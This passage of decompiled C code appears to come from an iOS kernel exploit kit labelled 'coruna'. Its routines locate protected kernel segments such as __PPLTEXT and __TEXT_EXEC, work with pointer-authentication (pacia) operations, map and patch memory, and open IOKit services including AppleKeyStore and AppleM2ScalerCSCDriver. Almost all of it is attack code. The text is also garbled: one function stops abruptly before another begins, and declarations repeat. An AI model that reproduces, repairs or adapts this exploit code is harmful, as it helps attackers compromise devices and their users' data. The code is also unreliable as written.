        coruna_macho_find_loadcmd(&host_info,*(long *)(&k_kernel_slot_19f8 + handle),"__PPLTEXT");
        if ((0x180919801fffff < *(unsigned long *)(handle + 0x158)) && (*(int *)(handle + 0x140) < 0x1c1b)) {
        if (serial_buf == 0) {
        return;
        }
        u = (unsigned long)*(uint *)(handle + 0x180);
        err = action < u;
        action = action - u;
        if (err || action == 0) {
        return;
        }
        serial_buf = serial_buf + u;
        }
        bootargs = serial_buf;
        scratch = host_info;
        thread_attr = action;
        handle = coruna_strsep(&scratch,ptr,0,1);
        if (handle == 0) {
        return;
        }
        addr = coruna_ret_stub_2(*(uint64_t *)(&k_kernel_slot_19f8 + handle),handle + -0x10);
        if (addr == 0) {
        addr = 0;
        }
        else {
        addr = coruna_helper_127b4_1b298_stub(*(uint64_t *)(&k_kernel_slot_19f8 + handle),addr);
        }
        if (*(int *)(handle + 0x140) < 0x1c1b) {
        err = 0;
        }
        else {
        handle = coruna_ret_stub_2(*(uint64_t *)(&k_kernel_slot_19f8 + handle),handle + -8);
        if (handle == 0) {
        return;
        }
        handle = coruna_helper_127b4_1b298_stub(*(uint64_t *)(&k_kernel_slot_19f8 + handle),handle);
        if (handle == 0) {
        return;
        }
        err = (int)handle - (int)addr;
        }
        if (addr == 0) {
        return;
        }
        if (*(int *)(handle + 0x140) < 0x1c1b) {
        if (*(int *)(handle + 0x140) < 0x1809) {
        err = 0x90000;
        }
        else {
        err = 0x88000;
        if (*(unsigned long *)(handle + 0x158) < 0x18090a07900000) {
        err = 0x8c000;
        }
        }
        }
        *(long *)(&k_kernel_slot_1888 + handle) = addr;
        *(int *)(&k_kernel_slot_1890 + handle) = err;
        *addr_2 = addr;
        *flags = err;
        return;
      }
    }
done:
    ptr = "1F 01 13 EB 20 91 53 FA .. .. 00 54 68 02";
  }
check_ok:
  coruna_macho_find_loadcmd(&host_info,*(long *)(&k_kernel_slot_19f8 + handle),"__PPLTEXT");
  if ((0x180919801fffff < *(unsigned long *)(handle + 0x158)) && (*(int *)(handle + 0x140) < 0x1c1b)) {
    if (serial_buf == 0) {
      return;
    }
    u = (unsigned long)*(uint *)(handle + 0x180);
    err = action < u;
    action = action - u;
    if (err || action == 0) {
      return;
    }
    serial_buf = serial_buf + u;
  }
  bootargs = serial_buf;
  scratch = host_info;
  thread_attr = action;
  handle = coruna_strsep(&scratch,ptr,0,1);
  if (handle == 0) {
    return;
  }
  addr = coruna_ret_stub_2(*(uint64_t *)(&k_kernel_slot_19f8 + handle),handle + -0x10);
  if (addr == 0) {
    addr = 0;
  }
  else {
    addr = coruna_helper_127b4_1b298_stub(*(uint64_t *)(&k_kernel_slot_19f8 + handle),addr);
  }
  if (*(int *)(handle + 0x140) < 0x1c1b) {
    err = 0;
  }
  else {
    handle = coruna_ret_stub_2(*(uint64_t *)(&k_kernel_slot_19f8 + handle),handle + -8);
    if (handle == 0) {
      return;
    }
    handle = coruna_helper_127b4_1b298_stub(*(uint64_t *)(&k_kernel_slot_19f8 + handle),handle);
    if (handle == 0) {
      return;
    }
    err = (int)handle - (int)addr;
  }
  if (addr == 0) {
    return;
  }
  if (*(int *)(handle + 0x140) < 0x1c1b) {
    if (*(int *)(handle + 0x140) < 0x1809) {
      err = 0x90000;
    }
    else {
      err = 0x88000;
      if (*(unsigned long *)(handle + 0x158) < 0x18090a07900000) {
        err = 0x8c000;
      }
    }
  }
  *(long *)(&k_kernel_slot_1888 + handle) = addr;
  *(int *)(&k_kernel_slot_1890 + handle) = err;
fail:
  *addr_2 = addr;
  *flags = err;
  return;
}
void coruna_kernel5_via_semaphore_timedwait(uint64_t val,uint64_t id_2,uint64_t size_3)
{
  unsigned long u;
  long handle;
  unsigned long size;
  int err;
  unsigned long version;
  uint64_t scratch;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t thread_attr;
  unsigned long bootargs;
  long thread_attr [2];
  char host_info;
  uint64_t host_info;
  uint64_t serial_buf;
  unsigned long serial_buf;
  
  serial_buf = 0;
  thread_attr[1] = 0;
  thread_attr[0] = 0;
  serial_buf = 0;
  host_info = 0;
  bootargs = 0;
  scratch = 0;
  scratch = 0;
  thread_attr = 0;
  bootargs = 0;
  err = coruna_kernel5_via_kernel5_via_pacia_12_6(val,size_3,&scratch);
  u = bootargs;
  if (((((err != 0) && (bootargs == '\x03')) &&
       (err = coruna_kernel5_via_kernel5_via_pacia_12_6(val,id_2,thread_attr), size = serial_buf, handle = thread_attr[0],
       err != 0)) &&
      ((host_info == '\x03' &&
       ((u = serial_buf & 0x3fff | (u >> 0xe & 0x3ffffffff) << 0xe,
        version = serial_buf & 0xffff000000000000 | u, (int)u == (int)serial_buf ||
        (err = coruna_kernel5_via_pacia_12_5(val,thread_attr[0],version), err != 0)))))) &&
     ((size >> 0x20 == version >> 0x20 ||
      (err = coruna_kernel5_via_pacia_12_5(val,handle + 4,version >> 0x20), err != 0)))) {
    coruna_semaphore_timedwait(val,&k_kernel_slot_2710);
  }
  return;
}
void coruna_kernel5_via_find_ppltext(long handle,unsigned long arg,uint64_t val)
{
  int err;
  uint scratch;
  unsigned long bootargs;
  uint32_t thread_attr;
  
  thread_attr = (uint32_t)val;
  bootargs = 0;
  scratch = 0;
  err = coruna_pacia_12(handle,0x5184001);
  if (err == 0) {
    return;
  }
  if (*(unsigned long *)(handle + 0x158) < 0x1f530000000000) {
    err = coruna_find_ppltext(handle,&bootargs,&scratch);
    if (err == 0) {
      return;
    }
    if ((bootargs <= arg) && (arg + 4 <= bootargs + scratch)) {
      coruna_kernel5_via_bzero_4(handle,arg,&thread_attr,4);
      return;
    }
  }
  coruna_kernel5_via_pacia_12_5(handle,arg,val);
  return;
}
void coruna_kernel5_via_pacia_12_5(long handle,uint64_t val,uint64_t id_2)
{
  int err;
  
  err = coruna_pacia_12(handle,0x5184000);
  if (((err == 0) ||
      ((*(unsigned long *)(handle + 0x158) < 0x2712000c700000 &&
       ((*(unsigned long *)(handle + 0x158) < 0x225c2380100000 || (0x2711 < *(int *)(handle + 0x140)))))))
     && ((err = coruna_pacia_12(handle,0x5100000), err == 0 ||
         ((*(unsigned long *)(handle + 0x158) < 0x27120007400000 &&
          ((*(unsigned long *)(handle + 0x158) < 0x225c1e80500000 || (0x2711 < *(int *)(handle + 0x140))))
          ))))) {
    coruna_kernel5_via_pacia_12_7(handle,val,id_2);
  }
  return;
}
void coruna_vm_deallocate_112cc(long handle,long addr_2,long off_3,uint size)
{
  long handle;
  uint u;
  uint8_t *ptr;
  kern_return_t lk4;
  int err;
  uint64_t size;
  unsigned long version;
  uint port;
  void *scratch;
  
  ptr = k_kernel_mach_task_self_slot;
  lk4 = _vm_allocate(*(vm_map_t *)k_kernel_mach_task_self_slot,(vm_address_t *)&scratch,
                       (unsigned long)*(uint *)(handle + 0x180),1);
  if (lk4 == 0) {
    size = coruna_ret_stub_2(handle,addr_2);
    port = 0;
    while( true ) {
      handle = addr_2 + (unsigned long)port;
      u = *(int *)(handle + 0x180) - ((uint)handle & *(uint *)(handle + 0x188));
      if (size - port <= u) {
        u = size - port;
      }
      version = (unsigned long)u;
      err = coruna_ret_stub_6(handle,handle,version,scratch);
      if (err == 0) break;
      err = _memcmp(scratch,(void *)(off_3 + (unsigned long)port),version);
      if (((err != 0) &&
          (err = coruna_kernel5_via_semaphore_timedwait_2(handle,handle,(void *)(off_3 + (unsigned long)port),version,size,0),
          err == 0)) || (port = u + port, port == size)) break;
    }
    _vm_deallocate(*(vm_map_t *)ptr,(vm_address_t)scratch,(unsigned long)*(uint *)(handle + 0x180));
  }
  return;
}
void coruna_ret_stub_2(uint64_t val,uint64_t id_2)
{
  coruna_kernel5_via_kernel5_via_ret_stub_6_4(val,id_2,0,id_2);
  return;
}
void coruna_kernel5_via_semaphore_timedwait_2(long handle,unsigned long arg,long addr_2,unsigned long arg,unsigned long val,
                 uint64_t val)
{
  int err;
  unsigned long u;
  uint64_t scratch[2];
  byte bootargs;
  uint thread_attr;
  
  if ((((arg != 0) && (addr_2 != 0)) && ((int)arg != 0)) &&
     (u = arg & (*(unsigned long *)(handle + 0x188) ^ 0xffffffffffffffff),
     u == ((arg + (arg & 0xffffffff)) - 1 &
              (*(unsigned long *)(handle + 0x188) ^ 0xffffffffffffffff)))) {
    if ((val & 1) == 0) {
      err = coruna_kernel5_via_kernel5_via_pacia_12_6(handle,u,scratch);
      if ((err != 0) && ((bootargs | 2) == 3)) {
        if ((thread_attr >> 7 & 1) != 0) {
          err = coruna_kernel5_via_find_ppltext(handle,scratch[0],thread_attr & 0xffffff7f);
          if (err == 0) {
            return;
          }
          coruna_semaphore_timedwait(handle,&k_kernel_slot_2710);
        }
        coruna_kernel5_via_call_mach_vm_machine_attribute_1d4f8(handle,arg,addr_2,arg,val);
      }
    }
    else {
      coruna_bzero_4(handle,arg,addr_2,arg,val);
    }
  }
  return;
}
void coruna_kernel5_via_kernel5_via_semaphore_timedwait_2(long handle,uint64_t val,long addr_2)
{
  int err;
  uint64_t u;
  long scratch;
  long bootargs;
  
  bootargs = addr_2;
  err = coruna_pacia_12(handle,0x5184001);
  if (((err != 0) && (err = coruna_kernel5_residual_257(handle,val,&scratch), err != 0)) &&
     (scratch != addr_2)) {
    u = coruna_ret_stub_2(handle,val);
    coruna_kernel5_via_semaphore_timedwait_2(handle,val,&bootargs,*(uint32_t *)(handle + 0x168),u,1);
  }
  return;
}
void coruna_kernel5_via_call_mach_vm_machine_attribute_1d4f8(long handle,uint64_t val,uint64_t id_2,int flags,int count_2)
{
  uint64_t scratch;
  
  if ((count_2 == 0) || (*(int *)(handle + 0x168) != flags)) {
    coruna_ret_stub_7(handle,val);
  }
  else {
    scratch = 0;
    ___memcpy_chk(&scratch,id_2,flags,8);
    coruna_call_mach_vm_machine_attribute_1d4f8(handle,val,scratch);
  }
  return;
}
void coruna_cfpropertylistcreatewithdata(uint *size,unsigned long arg,char *path)
{
  uint u;
  uint8_t *ptr;
  int err;
  size_t ls4;
  void **lppv5;
  long handle;
  void *ptr;
  long addr;
  long off;
  char *ptr;
  uint64_t size;
  uint64_t scratch;
  long bootargs;
  uint *thread_attr;
  uint32_t host_info;
  long serial_buf;
  uint64_t action;
  uint32_t block_ctx;
  pthread_t stack_guard;
  uint8_t sa_saved[24];
  int sa_new [26];
  long path_buf;
  
  path_buf = *(long *)k_kernel_stack_chk_guard_slot;
  scratch = 100;
  bootargs = 0;
  if (0x1f52ffffffffff < *(unsigned long *)(size + 0x56)) {
    coruna_cfdatagetbyteptr(size,arg,path,1);
    if (*(long *)k_kernel_stack_chk_guard_slot == path_buf) {
    return;
    }
    ___stack_chk_fail();
void coruna_open_m2scaler(long *handle)
{
  int err;
  int status;
  int flags;
  long handle;
  uint64_t u;
  long addr;
  uint64_t size;
  long off;
  uint32_t version;
  long *ptr;
  unsigned long scratch;
  long bootargs;
  uint64_t thread_attr;
  int host_info;
  
  off = *handle;
  ptr = (long *)handle[2];
  host_info = 0;
  bootargs = 0;
  thread_attr = 0;
  err = coruna_kernel5_via_kernel5_via_return_zero_28118_2(off,(int)handle[1]);
  if ((err != 0) && (handle = coruna_ptr_canonicalize(off,*(uint64_t *)(off + 0x390)), handle != 0)) {
    if (*(int *)(off + 0x140) < 0x1c1b) {
      u = coruna_ioservicegetmatchingservice_1bb7c("AppleM2ScalerCSCDriver");
      handle = 0;
    }
    else {
      u = coruna_ioservicegetmatchingservice_1bb7c("AppleKeyStore");
      err = coruna_ctx_test_flag(off,4);
      if (err != 0) {
        handle = 0;
      }
      else {
        handle = *(long *)(off + 0x3a8);
      }
    }
    if (1 < (int)u + 1U) {
      if (handle == 0) {
        err = _IOServiceOpen(u,*(uint32_t *)k_kernel_mach_task_self_slot,0,&host_info);
joined_r0x0000a220:
        version = 0;
        if (err == 0) {
          scratch = scratch & 0xffffffff00000000;
          handle = coruna_kernel5_via_return_zero_28118(off,host_info);
          if ((handle == 0) ||
             (err = _IORegistryEntryGetChildIterator(u,"IOService",&scratch), err != 0)) {
            version = 0;
          }
          else {
          while( true ) {
            size = _IOIteratorNext(scratch & 0xffffffff);
            err = (int)size;
            if (err == 0) break;
            addr = coruna_kernel5_via_return_zero_28118(off,size);
            if (handle == addr) {
              handle = 0;
              break;
            }
            _IOObjectRelease(size);
          }
          _IOObjectRelease(scratch & 0xffffffff);
          version = 0;
          if ((err != 0) && (handle != 0)) {
            handle = handle + 0x20;
            status = coruna_kernel5_residual_193(off,handle,&thread_attr);
            if ((status != 0) &&
               (status = coruna_call_mach_vm_machine_attribute_29df8_145b8(off,handle,*(uint64_t *)(off + 0x390)), status != 0)) {
              status = _IORegistryEntryCreateCFProperties
                                (size,&bootargs,*(uint64_t *)k_kernel_kcfallocatordefault_slot,0)
              ;
              flags = coruna_call_mach_vm_machine_attribute_29df8_145b8(off,handle,thread_attr);
              if ((flags == 0) || (status != 0)) {
                if (bootargs != 0) {
                  _CFRelease();
                }
              }
              else if (bootargs != 0) {
                *ptr = bootargs;
                version = 1;
              }
            }
            version = 0;
          }
          if (1 < err + 1U) {
            _IOObjectRelease(size);
          }
          }
        }
      }
      else {
        err = coruna_kernel5_via_call_mach_vm_machine_attribute_29df8_145b8(off,*(uint32_t *)(off + 0x37c),0);
        if (err == 0) {
          version = 0;
        }
        else {
          err = _IOServiceOpen(u,*(uint32_t *)k_kernel_mach_task_self_slot,0,&host_info);
          status = coruna_kernel5_via_call_mach_vm_machine_attribute_29df8_145b8(off,*(uint32_t *)(off + 0x37c),handle);
          version = 0;
          if (status != 0) {
            err = _IOServiceOpen(u,*(uint32_t *)k_kernel_mach_task_self_slot,0,&host_info);
            version = 0;
            if (err == 0) goto joined_r0x0000a220;
          }
        }
      }
      if (1 < host_info + 1U) {
        scratch = 1;
        _IOServiceClose();
        _IOServiceWaitQuiet(u,&scratch);
      }
      _IOObjectRelease(u);
      *(uint32_t *)(handle + 3) = version;
      return;
    }
  }
  version = 0;
skip:
  *(uint32_t *)(handle + 3) = version;
  return;
}
uint64_t coruna_ioservice_publish(uint64_t val,uint64_t id_2,mach_port_name_t *arg)
{
  uint8_t *ptr;
  mach_port_t host;
  kern_return_t lk2;
  uint64_t u;
  mach_port_name_t scratch;
  io_master_t bootargs;
  
  host = _mach_host_self();
  lk2 = _host_get_io_master(host,&bootargs);
  ptr = k_kernel_mach_task_self_slot;
  if ((lk2 == 0) &&
     (lk2 = _mach_port_allocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,1,&scratch),
     lk2 == 0)) {
    u = coruna_mig_reply_port(bootargs,"IOServicePublish",val,id_2,scratch,0,0);
    if ((int)u != 0) {
      *arg = scratch;
      return u;
    }
    _mach_port_destroy(*(ipc_space_t *)ptr,scratch);
  }
  return 0;
}
void coruna_call_ioservicegetmatchingservice_1a3ec(void)
{
  coruna_ioservicegetmatchingservice_1a3ec("xyz");
  return;
}
void coruna_pacia(void)
{
  return;
}
void coruna_kernel5_residual_225(long handle,unsigned long arg)
{
  unsigned long u;
  long handle;
  unsigned long size;
  long *ptr;
  
  if ((0xffffffffeffe < arg + 0x1000000000000) &&
     (size = (unsigned long)*(uint *)(&k_kernel_slot_18a0 + handle), *(uint *)(&k_kernel_slot_18a0 + handle) != 0)) {
    ptr = (long *)(&k_kernel_slot_1a18 + handle);
    do {
      u = ptr[-1];
      handle = *ptr;
      if ((((u != 0 && handle != 0) && u <= arg) && arg <= handle + u) &&
          (((u == 0 || handle == 0) || arg < u) || handle + u != arg)) {
        return;
      }
      ptr = ptr + 3;
      size = size - 1;
    } while (size != 0);
  }
  return;
}
void coruna_kernel5_residual_226(long *handle)
{
  long *ptr;
  long handle;
  unsigned long u;
  unsigned long *ptr;
  
  ptr = (long *)*handle;
  handle = *ptr + (unsigned long)*(uint *)(ptr + 0x19) * 0x38;
  if ((*(unsigned long *)(handle + 0x28) <= (unsigned long)(handle[1] - *(long *)(handle + 0x20))) &&
     (*(uint *)(ptr + 1) != 0)) {
    u = 0;
    ptr = (unsigned long *)(*ptr + 0x28);
    do {
      if (handle[1] - ptr[-1] < *ptr) {
        *(int *)(ptr + 0x19) = (int)u;
        return;
      }
      u = u + 1;
      ptr = ptr + 7;
    } while (*(uint *)(ptr + 1) != u);
  }
  return;
}
void coruna_pacia_2(void)
{
  return;
}
void coruna_vm_allocate(long handle)
{
  size_t ls1;
  kern_return_t lk2;
  unsigned long u;
  vm_address_t scratch;
  
  if ((((*(char *)(handle + 0x101) == '\0') && (*(byte **)(handle + 0x108) != (byte *)0x0)) &&
      (scratch = *(vm_address_t *)(handle + 0xb0), scratch != 0)) &&
     (((*(vm_size_t *)(handle + 0xb8) != 0 && ((**(byte **)(handle + 0x108) >> 1 & 1) != 0)) &&
      (lk2 = _vm_allocate(*(vm_map_t *)k_kernel_mach_task_self_slot,&scratch,
                            *(vm_size_t *)(handle + 0xb8),0x4000), lk2 == 0)))) {
    u = (unsigned long)*(int *)(handle + 0x38);
    ls1 = 0;
    if (u != 0) {
      ls1 = ((u + *(long *)(handle + 0xe8)) - 1 & (long)-*(int *)(handle + 0x38)) / u;
    }
    _bzero(*(void **)(handle + 0x108),ls1);
  }
  return;
}
void coruna_kernel5_via_pacia_4(long handle,unsigned long arg,unsigned long arg,unsigned long val,uint size)
{
  int err;
  uint u;
  unsigned long size;
  unsigned long version;
  unsigned long port;
  long handle;
  unsigned long tag;
  unsigned long kind;
  
  handle = handle;
  if (*(char *)(handle + 0x101) != '\0') {
    handle = *(long *)(handle + 0xa8);
  }
  tag = *(unsigned long *)(handle + 0xb0);
  if ((tag <= arg) && (arg + arg <= *(long *)(handle + 0xb8) + tag)) {
    version = (unsigned long)-*(int *)(handle + 0x38);
    port = version & arg;
    version = ((long)*(int *)(handle + 0x38) + arg + arg) - 1 & version;
    if (port < version) {
      kind = (unsigned long)*(int *)(handle + 0x38);
      do {
        size = 0;
        if (kind != 0) {
          size = (port - tag) / kind;
        }
        if (((*(byte *)(*(long *)(handle + 0x108) + size) & 1) == 0) || ((size & 1) != 0)) {
          err = coruna_kernel5_residual_254(*(uint64_t *)(handle + 0x118));
          if (((err != 0) &&
              (((err = coruna_uuid_is_null(*(uint64_t *)(handle + 0x118)), err != 0 &&
                (u = coruna_pacia_4(*(uint64_t *)(handle + 0x118)),
                *(uint *)(handle + 0x38) < u)) &&
               (size = coruna_pacia_4(*(uint64_t *)(handle + 0x118)),
               version - port < (size & 0xffffffff))))) && (arg < val)) {
            version = ((long)*(int *)(handle + 0x38) + arg + val) - 1 &
                    (long)-*(int *)(handle + 0x38);
            size = coruna_pacia_4(*(uint64_t *)(handle + 0x118));
            if (port + (size & 0xffffffff) < version) {
              version = coruna_pacia_4(*(uint64_t *)(handle + 0x118));
              version = port + (version & 0xffffffff);
            }
          }
          err = coruna_ret_stub_6(*(uint64_t *)(handle + 0x118),
                               (*(long *)(handle + 0xe0) - tag) + port,version - port,port);
          if (err == 0) {
            return;
          }
          if (port < version) {
            do {
              size = 0;
              if (kind != 0) {
                size = (port - tag) / kind;
              }
              *(byte *)(*(long *)(handle + 0x108) + size) =
                   *(byte *)(*(long *)(handle + 0x108) + size) | 1;
              port = port + kind;
            } while (port < version);
          }
          **(byte **)(handle + 0x108) = **(byte **)(handle + 0x108) | 2;
          return;
        }
        port = port + kind;
      } while (port < version);
    }
  }
  return;
}
void coruna_kernel5_via_kernel5_via_pacia_4(void)
{
  coruna_kernel5_via_pacia_4();
  return;
}
void coruna_kernel5_via_kernel5_via_pacia_4_2(uint64_t val,uint64_t id_2)
{
  long handle;
  uint64_t scratch;
  uint64_t scratch;
  uint64_t bootargs;
  
  bootargs = 4;
  scratch = val;
  scratch = id_2;
  handle = coruna_kernel5_residual_226(&scratch,1);
  if (handle != 0) {
    coruna_kernel5_via_pacia_4(val,handle,4,0,0);
  }
  return;
}
void coruna_kernel5_via_kernel5_via_pacia_4_3(uint64_t val,uint64_t id_2)
{
  long handle;
  uint64_t scratch;
  uint64_t scratch;
  uint64_t bootargs;
  
  bootargs = 8;
  scratch = val;
  scratch = id_2;
  handle = coruna_kernel5_residual_226(&scratch,1);
  if (handle != 0) {
    coruna_kernel5_via_pacia_4(val,handle,8,0,0);
  }
  return;
}
void coruna_kernel5_via_kernel5_via_kernel5_via_pacia_4_3(void)
{
  coruna_kernel5_via_kernel5_via_pacia_4_3();
  return;
}
void coruna_macho_find_loadcmd(long *handle,long addr_2,char *path)
{
  int *err;
  int *status;
  int err;
  long handle;
  
  err = (int *)(**(long **)(addr_2 + 0xd0) + 0x20);
  status = (int *)((long)err + (unsigned long)*(uint *)(**(long **)(addr_2 + 0xd0) + 0x14));
  while( true ) {
    if (status <= err) {
      *handle = 0;
      handle[1] = 0;
      handle[2] = 0;
      return;
    }
    if ((*err == 0x19) && (err = _strncmp((char *)(err + 2),path,0x10), err == 0))
    break;
  }
  *handle = addr_2;
  handle = *(long *)(err + 6);
  handle[2] = *(long *)(err + 8);
  handle[1] = handle;
  return;
}
void coruna_macho_map_segsect(long *handle,long addr_2,char *path,char *str_2)
{
  int *err;
  int *status;
  int err;
  int *flags;
  unsigned long u;
  long handle;
  
  err = (int *)(**(long **)(addr_2 + 0xd0) + 0x20);
  status = (int *)((long)err + (unsigned long)*(uint *)(**(long **)(addr_2 + 0xd0) + 0x14));
  do {
    if (status <= err) {
      *handle = 0;
      handle[1] = 0;
      handle[2] = 0;
      return;
    }
    if (((*err == 0x19) && (err = _strncmp((char *)(err + 2),path,0x10), err == 0)) &&
       (u = (unsigned long)(uint)err[0x10], err[0x10] != 0)) {
      flags = err + 0x12;
      do {
        err = _strncmp((char *)flags,str_2,0x10);
        if (err == 0) {
          *handle = addr_2;
          handle = *(long *)(flags + 8);
          handle[2] = *(long *)(flags + 10);
          handle[1] = handle;
          return;
        }
        flags = flags + 0x14;
        u = u - 1;
      } while (u != 0);
    }
    err = (int *)((long)err + (unsigned long)(uint)err[1]);
  } while( true );
}
void coruna_macho_text_sect(long handle)
{
  coruna_macho_map_segsect(handle,*(uint64_t *)(handle + 0x110),"__text");
  return;
}
void coruna_kernel5_residual_227(long handle,char *path,unsigned long arg)
{
  int *err;
  int *status;
  size_t ls3;
  uint u;
  int err;
  uint size;
  
  err = (int *)(**(long **)(handle + 0xd0) + 0x20);
  status = (int *)((long)err + (unsigned long)*(uint *)(**(long **)(handle + 0xd0) + 0x14));
  do {
    if (status <= err) {
      return;
    }
    if (*err == -0x7fffffcb) {
      u = err[6];
      size = err[1];
      if (0x1f < u && u < size) {
        ls3 = arg;
        if (size - u <= arg) {
          ls3 = (unsigned long)(size - u);
        }
        err = _strncmp((char *)((long)err + (unsigned long)u),path,ls3);
        if (err == 0) {
          return;
        }
      }
    }
    else {
      size = err[1];
    }
    err = (int *)((long)err + (unsigned long)size);
  } while( true );
}
void coruna_ctx_clear_12bc4(uint64_t *val,uint64_t id_2)
{
  val[0x21] = 0;
  val[0x20] = 0;
  val[0x23] = 0;
  val[0x22] = 0;
  val[0x1d] = 0;
  val[0x1c] = 0;
  val[0x1f] = 0;
  val[0x1e] = 0;
  val[0x19] = 0;
  val[0x18] = 0;
  val[0x1b] = 0;
  val[0x1a] = 0;
  val[0x15] = 0;
  val[0x14] = 0;
  val[0x17] = 0;
  val[0x16] = 0;
  val[0x11] = 0;
  val[0x10] = 0;
  val[0x13] = 0;
  val[0x12] = 0;
  val[0xd] = 0;
  val[0xc] = 0;
  val[0xf] = 0;
  val[0xe] = 0;
  val[9] = 0;
  val[8] = 0;
  val[0xb] = 0;
  val[10] = 0;
  val[5] = 0;
  val[4] = 0;
  val[7] = 0;
  val[6] = 0;
  val[1] = 0;
  *val = 0;
  val[3] = 0;
  val[2] = 0;
  val[0x23] = id_2;
  val[0x24] = 0;
  return;
}
void coruna_vm_deallocate_12c18(long handle)
{
  kern_return_t lk1;
  vm_address_t address;
  
  address = *(vm_address_t *)(handle + 0xb0);
  if (((address != 0) && (*(vm_size_t *)(handle + 0xb8) != 0)) &&
     (lk1 = _vm_deallocate(*(vm_map_t *)k_kernel_mach_task_self_slot,address,
                             *(vm_size_t *)(handle + 0xb8)), lk1 == 0)) {
    *(vm_address_t *)(handle + 0xb0) = 0;
    *(uint64_t *)(handle + 0xb8) = 0;
  }
  return;
}
void coruna_vm_deallocate_12c8c(long handle)
{
  size_t ls1;
  uint8_t *ptr;
  kern_return_t lk3;
  void *ptr;
  unsigned long u;
  vm_inherit_t in_stack_ffffffffffffffd0;
  vm_address_t scratch;
  
  ptr = k_kernel_mach_task_self_slot;
  scratch = 0;
  lk3 = _vm_map(*(vm_map_t *)k_kernel_mach_task_self_slot,&scratch,
                  *(vm_size_t *)(handle + 0xe8),(long)*(int *)(handle + 0x38) - 1,1,0,0,0,3,1,
                  in_stack_ffffffffffffffd0);
  if (lk3 == 0) {
    if ((*(vm_address_t *)(handle + 0xb0) != 0) && (*(vm_size_t *)(handle + 0xb8) != 0)) {
      _vm_deallocate(*(vm_map_t *)ptr,*(vm_address_t *)(handle + 0xb0),
                     *(vm_size_t *)(handle + 0xb8));
    }
    *(vm_address_t *)(handle + 0xb0) = scratch;
    *(long *)(handle + 0xb8) = *(long *)(handle + 0xe8);
    *(vm_address_t *)(handle + 0xf0) = *(long *)(handle + 0xe0) - scratch;
    u = (unsigned long)*(int *)(handle + 0x38);
    ls1 = 0;
    if (u != 0) {
      ls1 = ((u + *(long *)(handle + 0xe8)) - 1 & (long)-*(int *)(handle + 0x38)) / u;
    }
    ptr = _calloc(ls1,1);
    *(void **)(handle + 0x108) = ptr;
  }
  return;
}
void coruna_macho_text_seg(long handle,long addr_2)
{
  size_t ls1;
  int *err;
  int err;
  void *ptr;
  int *status;
  uint8_t u;
  unsigned long size;
  long *buf;
  long handle;
  int *flags;
  uint8_t scratch[20];
  uint bootargs;
  
  ptr = _calloc(0x48,1);
  *(void **)(handle + 0xd0) = ptr;
  if ((ptr != (void *)0x0) &&
     (err = coruna_ret_stub_6(*(uint64_t *)(handle + 0x118),addr_2,0x20,scratch), err != 0)) {
    ls1 = (unsigned long)bootargs + 0x20;
    status = _calloc(ls1,1);
    if ((status != (int *)0x0) &&
       (err = coruna_ret_stub_6(*(uint64_t *)(handle + 0x118),addr_2,ls1,status), err != 0)) {
      **(uint64_t **)(handle + 0xd0) = status;
      if (*status == -0x1120532) {
        u = 4;
      }
      else {
        if (*status != -0x1120531) {
          return;
        }
        u = 8;
      }
      *(uint8_t *)(handle + 0x34) = u;
      if (status[5] + 0x20 <= ls1) {
        err = status + 8;
        status = (int *)((long)err + (unsigned long)(uint)status[5]);
        if (err < status) {
          handle = 0;
          flags = err;
          do {
            if ((*flags == 0x19) && (err = _strcmp((char *)(flags + 2),"__TEXT"), err == 0))
            {
              handle = addr_2 - *(long *)(flags + 6);
            }
            flags = (int *)((long)flags + (unsigned long)(uint)flags[1]);
          } while (flags < status);
          if (handle != 0) {
            for (; err < status; err = (int *)((long)err + (unsigned long)(uint)err[1])) {
              if (*err == 0x19) {
                size = (unsigned long)(uint)err[0x10];
                if (err[0x10] != 0) {
                  buf = (long *)(err + 0x1a);
                  do {
                    *buf = *buf + handle;
                    size = size - 1;
                    buf = buf + 10;
                  } while (size != 0);
                }
                *(long *)(err + 6) = *(long *)(err + 6) + handle;
              }
            }
          }
        }
      }
    }
  }
  return;
}
void coruna_call_return_zero_61a8(void)
{
  coruna_find_text_exec();
  return;
}
void coruna_find_text_exec(long *handle,uint32_t size,unsigned long arg,uint64_t val)
{
  uint8_t (*lpau1) [16];
  int *err;
  int *status;
  uint u;
  bool err;
  int err;
  long *ptr;
  uint size;
  unsigned long version;
  unsigned long port;
  int *flags;
  uint tag;
  uint kind;
  long handle;
  unsigned long type_id;
  unsigned long type_id_8;
  unsigned long type_id_9;
  long addr;
  uint8_t version[16];
  uint8_t scratch[16];
  long bootargs;
  
  err = coruna_macho_text_seg(handle,arg);
  if (err != 0) {
    *(uint32_t *)(handle + 0x1b) = size;
    *(uint8_t *)(handle + 0x20) = 1;
    handle = *(long *)handle[0x1a];
    flags = (int *)(handle + 0x20);
    kind = *(uint *)(handle + 0x14);
    status = (int *)((long)flags + (unsigned long)kind);
    if ((flags < status && (int *)(handle + 0x28U) <= status) && flags <= status + -2) {
      size = 0;
      while( true ) {
        u = flags[1];
        if ((u < 8) || ((unsigned long)((long)status - (long)flags) < (unsigned long)u)) break;
        err = *flags;
        tag = 0x18;
        if (err < 0xb) {
          if (err != -0x7fffffe1) {
            tag = 0x30;
            }
            else {
            flags = (int *)((long)flags + (unsigned long)u);
            if (((status <= flags) || (status < flags + 2)) || (status + -2 < flags)) break;
            flags = (int *)((long)flags + (unsigned long)u);
            if (((status <= flags) || (status < flags + 2)) || (status + -2 < flags)) break;
          }
cleanup:
          if (u < tag) break;
        }
        else {
          if (0x18 < err) {
            if (err == 0x22) {
fail:
              tag = 0x30;
            }
            else {
              flags = (int *)((long)flags + (unsigned long)u);
              if (((status <= flags) || (status < flags + 2)) || (status + -2 < flags)) break;
              size = size + 1;
              tag = 0x48;
            }
            if (u < tag) break;
          }
          if (err == 0xb) {
            tag = 0x50;
            if (u < tag) break;
          }
          if (u < tag) break;
        }
done:
        flags = (int *)((long)flags + (unsigned long)u);
        if (((status <= flags) || (status < flags + 2)) || (status + -2 < flags)) break;
      }
      if (size != 0) {
        *(uint *)(handle + 1) = size;
        ptr = _malloc((unsigned long)size * 0x38);
        *handle = (long)ptr;
        if (ptr != (long *)0x0) {
          handle[0x22] = (long)"__TEXT";
          flags = (int *)(handle + 0x20);
          status = (int *)((long)flags + (unsigned long)kind);
          if (flags < status) {
            do {
              if (*flags == 0x19) {
                if (((unsigned long)(uint)flags[1] - 0x48) / 0x50 < (unsigned long)(uint)flags[0x10]) {
                  return;
                }
                err = _strcmp((char *)(flags + 2),"__TEXT_EXEC");
